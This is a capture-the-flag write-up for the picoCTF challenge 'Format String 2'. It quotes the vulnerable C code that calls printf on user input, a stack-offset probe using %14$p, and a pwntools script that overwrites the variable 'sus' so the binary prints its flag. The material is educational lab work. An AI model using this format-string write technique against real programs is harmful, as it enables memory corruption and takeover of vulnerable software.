# Writeup: Format String 2

The vulnerability that we will be taking advantage of is the format string vulnerability found on this line of code in the provided source file:

```
    printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
    fflush(stdout);
    scanf("%1024s", buf);
    printf("Here's your input: ");
    printf(buf);    
```

What this does is pass user input directly to printf without a format specifier allowing us to take advantage of the different formats the printf function lets us use, namely the %p and the %n format specifiers. Right off of the bat we have a variable whose value we need to change so that we can access the flag. After using checksec to figure out what restrictions are on this binary I was shown the following output.

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified   Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   42 Symbols        No    0               2   ./vuln
```

What is relevant to us is that there is no PIE meaning the addresses are fixed across all instances of the program meaning I can go into gdb and grab address manually or use python and pwntools to grab the address from the binary. Once the address is obtained all I need to do is to figure out what the position of the buffer is on the stack so that I can write the value necessary to unlock the flag through the printf character count to the address in the buffer which is the address of the variable we want to overwrite, that variable being 'sus.' In order to leak the offset I wrote passed this input to the binary once prompted while cycling through different positions on the stack until I found the hex value that corresponds to my input:

```
    You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
    AAAAAAAAAAA%14$p
    Here's your input: AAAAAAAAAAA0x4141414141414141
    sus = 0x21737573
    You can do better!
```

As you can see at position 14 the hex value matches my input. The value that we will be overwriting the value currently present in sus is 0x67616c66 because it is the value necessary to meet the condition that will allow the program to print the flag as shown here:


```
    if (sus == 0x67616c66) {
        printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

        // Read in the flag
        FILE *fd = fopen("flag.txt", "r");
        fgets(flag, 64, fd);

        printf("%s", flag);
        fflush(stdout);
  }
```

Based on this information we can now code up the solution:

```
    from pwn import *

    context.arch = 'amd64'
    # connect to the server
    p = remote('rhea.picoctf.net', 50404)
    
    # find the address of sus and print it
    elf = ELF('./vuln')
    target_addr = elf.sym['sus']
    print(hex(target_addr))

    # construct the payload using the leaked input buffer offset
    payload = fmtstr_payload(14, {target_addr: 0x67616c66}, write_size='short')
    print(f'Payload: {payload}')
    print(f'Payload length: {len(payload)}')

    # send the payload
    p.sendline(payload)
    p.interactive()
``` 
